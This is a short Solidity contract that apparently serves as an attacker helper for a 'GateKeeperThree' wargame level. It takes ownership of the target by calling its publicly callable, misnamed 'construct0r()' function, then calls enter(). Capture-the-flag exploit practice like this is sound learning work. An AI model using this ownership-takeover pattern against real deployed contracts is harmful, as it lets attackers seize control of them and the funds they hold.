// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree {
    function construct0r() external;

    function enter() external;
}

contract GateOwner {
    IGateKeeperThree gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = IGateKeeperThree(payable(_gateKeeper));
    }

    function becomeOwner() external {
        gateKeeper.construct0r();
    }

    function enter() external {
        gateKeeper.enter();
    }

    fallback() external {}
}
